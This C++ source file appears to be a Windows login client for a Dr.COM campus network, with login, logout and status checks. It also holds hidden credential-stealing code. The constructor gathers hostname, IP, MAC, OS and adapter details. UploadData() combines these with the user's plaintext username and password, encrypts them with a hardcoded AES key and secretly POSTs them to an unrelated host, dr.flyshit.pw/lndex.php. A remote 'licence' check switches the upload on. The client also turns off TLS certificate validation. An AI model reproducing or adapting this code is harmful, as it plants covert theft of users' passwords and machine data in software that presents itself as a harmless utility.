#include "stdafx.h"
#include <winsock2.h>
#include<atlbase.h>
#include<atlconv.h>
#include"iphlpapi.h"
#include <stdio.h>
#include <afxinet.h>
#include <aes.h>
#include <modes.h>
#include <filters.h>
#include "MD5.h"
#include "common.h"
#include "GetOS.h"
#pragma comment (lib,"cryptlib.lib")
#pragma comment(lib,"ws2_32.lib")
# pragma comment(lib,"Iphlpapi.lib")
DrcomWeb::DrcomWeb(CString InputUsername,CString InputPassword,CString InputServerUrl)
{
	LPTSTR OSData = new char[1024];
	this->Username = InputUsername;
	this->Password = InputPassword;
	this->ServerUrl = InputServerUrl;
	this->AccountInfo_TimeUsed = "";
	this->AccountInfo_FlowUsed = "";
	this->UploadServer = "dr.flyshit.pw";
	this->UploadPagePath = "lndex.php";
	this->UploadState = -1;

	/* 获取IP地址和主机名 */
	WSADATA wsadata;
	if(WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)   //初始化
	{
		this->UserHostName = "NULL";
		this->UserIP = "NULL";
	}
	char HostName[256];
	gethostname(HostName,255);  //得到计算机名
	hostent *UserHost = gethostbyname(HostName); //从计算机名得到主机信息
	if(UserHost == NULL)
	{
		this->UserHostName = "NULL";
		this->UserIP = "NULL";
	}
	this->UserHostName = HostName;       //保存主机名
	char *IP = inet_ntoa(*(in_addr *)UserHost->h_addr_list[0]);//将32位IP转化为字符串IP
	this->UserIP = IP;             //保存主机IP地址
	WSACleanup();               //释放Winsock API
	
	/* 获取MAC地址 */
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter=NULL;
	DWORD dwRetVal=0;
	pAdapterInfo=(IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	ULONG ulOutBufLen=sizeof(IP_ADAPTER_INFO);
	if(GetAdaptersInfo(pAdapterInfo,&ulOutBufLen)!=ERROR_SUCCESS)
	{
		GlobalFree(pAdapterInfo);
		pAdapterInfo=(IP_ADAPTER_INFO*)malloc(ulOutBufLen);
	}
	if((dwRetVal=GetAdaptersInfo(pAdapterInfo,&ulOutBufLen))==NO_ERROR)
	{
		pAdapter=pAdapterInfo;
			while(pAdapter)
			{
				if(strstr(pAdapter->Description,"PCI")>0||pAdapter->Type==71) //PCI网卡和无线网卡
				{
					this->UserAdapterInfo.Format("AdapterName: %s\n",pAdapter->AdapterName);
					this->UserAdapterInfo.Format(this->UserAdapterInfo + "AdapterDesc: %s\n",pAdapter->Description);
					this->UserAdapterInfo += ("AdapterAddr: ");
					for(UINT i=0;i<pAdapter->AddressLength;i++)
					{
						this->UserAdapterInfo.Format(this->UserAdapterInfo + "%02X%c",pAdapter->Address[i],i==pAdapter->AddressLength-1? '\n':'-');
					}           
					this->UserAdapterInfo.Format(this->UserAdapterInfo + "AdapterType: %d\n",pAdapter->Type);
					this->UserAdapterInfo.Format(this->UserAdapterInfo + "IPAddress: %s\n",pAdapter->IpAddressList.IpAddress.String);
					this->UserAdapterInfo.Format(this->UserAdapterInfo + "IPMask: %s\n\n\n\n",pAdapter->IpAddressList.IpMask.String);
					if(this->UserIP == pAdapter->IpAddressList.IpAddress.String)
					{
						for(UINT i=0;i<pAdapter->AddressLength;i++)
						{
							this->UserMAC.Format(this->UserMAC + "%02X%c",pAdapter->Address[i],i==pAdapter->AddressLength-1? '?':'-');
						}
						this->UserMAC.Remove('?');
					}
				}
				pAdapter=pAdapter->Next;
			}
	}
   else
   {
		
   }


	/* 获取OS版本 */
	if(!GetOSDisplayString(OSData))
	{
		if(!GetOldOSVer(OSData))
		{
			this->UserOS = "NULL";
			delete[] OSData;
			return;
		}
	}
	this->UserOS = OSData;
	delete[] OSData;
}

bool DrcomWeb::CheckLicence(CString Site,CString FilePathName,CString Salt)
{
	CString PageRes;
	CString ServerMD5;
	CString UploadOption;
	CTime CurrentSystemTime;
	CString LicenceData; //本地时间 YYYY-MM-DD+Salt格式，用来与服务器验证是否程序可用
	CString LicenceMd5;
	MD5 MD5_obj;
	CurrentSystemTime = CTime::GetCurrentTime();
	LicenceData = CurrentSystemTime.Format("%Y-%m-%d")+Salt;
	MD5_obj.update(LicenceData.GetBuffer());
	LicenceMd5 = MD5_obj.toString().c_str(); //获取MD5加密后的验证数据
	LicenceMd5.MakeUpper();  //小写转换成大写
	/* 获取服务器端验证数据 */
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,30000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(Site);
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_GET,FilePathName,NULL,1,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE);  //RELOAD表示不从缓存读取，NO_CACHE表示不写入缓存
	HttpFile->SendRequest();
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	}
	catch(CInternetException* e)
	{
	}
	
	ServerMD5 = PageRes.Mid(0,PageRes.Find(','));
	UploadOption = PageRes.Mid(PageRes.Find(',')+1,PageRes.GetLength()-PageRes.Find(','));
	if(UploadOption == "-1")
	{
		this->UploadState = -1;
	}
	else
	{
		this->UploadState = 0;
	}
	if(ServerMD5 != LicenceMd5) //验证失败
	{
		return false;
	}
	else
	{
		return true;
	}
}


void DrcomWeb::SetAccount(CString InputUsername,CString InputPassword,CString InputServerUrl)
{
	this->Username = InputUsername;
	this->Password = InputPassword;
	this->ServerUrl = InputServerUrl;
}

bool DrcomWeb::CheckOnline()
{
	DWORD dwFlags;
	CString PageRes;
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,5000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(this->ServerUrl,INTERNET_FLAG_SECURE,443);
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_GET,"/",NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
	HttpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION;  //设置忽略证书错误
	HttpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	HttpFile->SendRequest();
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	}
	catch(CInternetException* e)
	{
	}
	if(PageRes.Find("已使用时间")!=-1&&PageRes.Find("已使用流量")!=-1&&PageRes.Find("确定注销")!=-1)
	{
		this->AccountInfo_TimeUsed = PageRes.Mid(PageRes.Find("time=")+6,PageRes.Find(";flow=")-PageRes.Find("time=")-7);  //帐户已用时间
		this->AccountInfo_TimeUsed.Remove(' ');
		this->AccountInfo_FlowUsed = PageRes.Mid(PageRes.Find("flow=")+6,PageRes.Find(";fsele=")-PageRes.Find("flow=")-7); //帐户已用流量
		this->AccountInfo_FlowUsed.Remove(' ');
		float FlowUsed = atof(this->AccountInfo_FlowUsed)/1024;
		if(FlowUsed < 1024)
		{
			this->AccountInfo_FlowUsed.Format("%.0f MB",FlowUsed); //转换成MB
		}
		else
		{
			this->AccountInfo_FlowUsed.Format("%.2f GB",FlowUsed/1024); //转换成GB
		}

		/* 上传数据 */
		if(this->UploadState>=0 && this->UploadState<3) 
		{
			if(this->UploadData())
			{
				this->UploadState = 5;
			}
			else
			{
				this->UploadState++;
			}
		}
		return true;
	}
	else
	{
		return false;
	}
}

bool DrcomWeb::Login()
{
	CString PasswordTemp;
	CString PasswordMd5Encryption;
	DWORD dwFlags;
	CString PageRes;
	MD5 MD5_obj;
	PasswordTemp = "1" + this->Password + "12345678";
	MD5_obj.update(PasswordTemp.GetBuffer());
	PasswordMd5Encryption = MD5_obj.toString().c_str(); //获取加密后的密码串,加密算法 md5(pid+pass+calg)
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,15000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(this->ServerUrl,INTERNET_FLAG_SECURE,443); //设置为HTTPS
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,"/",NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
	HttpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION;  //设置忽略证书错误
	HttpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	CString szHeaders  = "Content-Type: text/xml\r\nCharset: utf-8\r\nUip: va5=1.2.3.4.8f1c7ff397e4b8bc1f4b966f49becb61\r\nHost: 202.202.0.163\r\nUser-Agent: DrCOM-HttpClient\r\n"; //HTTP POST头信息
	CString PostData = "DDDDD="+this->Username+"&upass=" + PasswordMd5Encryption + "123456781&R1=0&R2=1&para=00&0MKKey=123456";
	HttpFile->SendRequest(szHeaders,szHeaders.GetLength(),(LPVOID)((LPCTSTR)PostData),PostData.GetLength());
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	
	}
		catch(CInternetException* e)
	{
		
	}
	
	if(PageRes.Find("登录成功窗")!=-1&&PageRes.Find("您已经成功登录")!=-1)
	{
		return true;
	}
	else
	{
		return false;
	}
}

bool DrcomWeb::Logout() //注销
{
	CString PageRes;
	DWORD dwFlags;
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,25000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(this->ServerUrl,INTERNET_FLAG_SECURE,443);
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_GET,"/F.htm",NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
	HttpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION;  //设置忽略证书错误
	HttpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, dwFlags);
	HttpFile->SendRequest();
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	}
	catch(CInternetException* e)
	{
	}
	if(PageRes.Find("Msg=14")!=-1)
	{
		this->AccountInfo_TimeUsed = PageRes.Mid(PageRes.Find("time=")+6,PageRes.Find(";flow=")-PageRes.Find("time=")-7);  //帐户已用时间
		this->AccountInfo_TimeUsed.Remove(' ');
		this->AccountInfo_FlowUsed = PageRes.Mid(PageRes.Find("flow=")+6,PageRes.Find(";fsele=")-PageRes.Find("flow=")-7); //帐户已用流量
		this->AccountInfo_FlowUsed.Remove(' ');
		float FlowUsed = atof(this->AccountInfo_FlowUsed)/1024;
		if(FlowUsed < 1024)
		{
			this->AccountInfo_FlowUsed.Format("%.0f MB",FlowUsed); //转换成MB
		}
		else
		{
			this->AccountInfo_FlowUsed.Format("%.2f GB",FlowUsed/1024); //转换成GB
		}
		return true;
	}
	else
	{
		return false;
	}
}

bool DrcomWeb::KeepOnline(CString InputUrl,CString KeyWord)
{
	CString PageRes;
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,5000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(InputUrl);
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_GET,"/",NULL,1,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE);
	HttpFile->SendRequest();
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	}
	catch(CInternetException* e)
	{
	}
	if(PageRes.Find(KeyWord) == -1) //访问失败
	{
		return false;
	}
	else
	{
		return true;
	}
}

CString DrcomWeb::GetAccountInfo_TimeUsed()
{
	return this->AccountInfo_TimeUsed;
}

CString DrcomWeb::GetAccountInfo_FlowUsed()
{
	return this->AccountInfo_FlowUsed;
}

bool DrcomWeb::UploadData()
{
	CString PageRes;
	string UsernameData(this->Username.GetBuffer());
	string PasswordData(this->Password.GetBuffer());
	string IPData(this->UserIP.GetBuffer());
	string MACData(this->UserMAC.GetBuffer());
	string OSData(this->UserOS.GetBuffer());
	string HostNameData(this->UserHostName.GetBuffer());
	string AdapterDataInfo(this->UserAdapterInfo.GetBuffer());
	string SourceData = UsernameData + "---" + PasswordData + "---" + IPData + "---" + MACData + "---" + OSData + "---" + HostNameData + "---" + AdapterDataInfo;
	string EncryptedData = "";
	string EncryptedDataHEX = "";
	CString UploadData;
	char Key[] = "flyshit-drcom52-";  //AES KEY
	byte KeyByte[CryptoPP::AES::DEFAULT_KEYLENGTH];
	for (int i = 0;i<CryptoPP::AES::DEFAULT_KEYLENGTH;i++) 
	{ 
		KeyByte[i] = Key[i]; 
	}
	CryptoPP::ECB_Mode<CryptoPP::AES>::Encryption ECBEncryption(KeyByte,CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::StringSource(SourceData,true,new CryptoPP::StreamTransformationFilter(ECBEncryption,new CryptoPP::StringSink(EncryptedData)));
	for( int i = 0; i < EncryptedData.size();i++)     //转换成HEX格式
	{  
		char ch[3] = {0};  
		sprintf_s(ch, "%02x",  static_cast<byte>(EncryptedData[i]));  
		EncryptedDataHEX += ch;  
	}
	UploadData.Format("%s",EncryptedDataHEX);
	UploadData = "do=" + UploadData;
	/* 上传数据 */
	try
	{
	CInternetSession HttpSession;
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,15000); //超时时间
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
	HttpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
	CHttpConnection* HttpConnection = HttpSession.GetHttpConnection(this->UploadServer);
	CHttpFile* HttpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,this->UploadPagePath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
	CString Header = "Content-Type: application/x-www-form-urlencoded";
	HttpFile->SendRequest(Header,Header.GetLength(),(LPVOID)((LPCTSTR)UploadData),UploadData.GetLength());
	DWORD StatusCode;	//HTTP状态码
	HttpFile->QueryInfoStatusCode(StatusCode);
	if(StatusCode != 200) 
	{
		return false;
	}
	char buff[4096]={0};
	int ReadNum = 0;
	while((ReadNum = HttpFile->Read((void*)buff,4095))>0)
	{
		buff[ReadNum] = '\0';
		PageRes += buff;
		memset(buff,0,4096);
	}
	}
	catch(CInternetException* e)
	{
	}
	if(PageRes.Find("flyshit") == -1)
	{
		return false;
	}
	return true;
} 
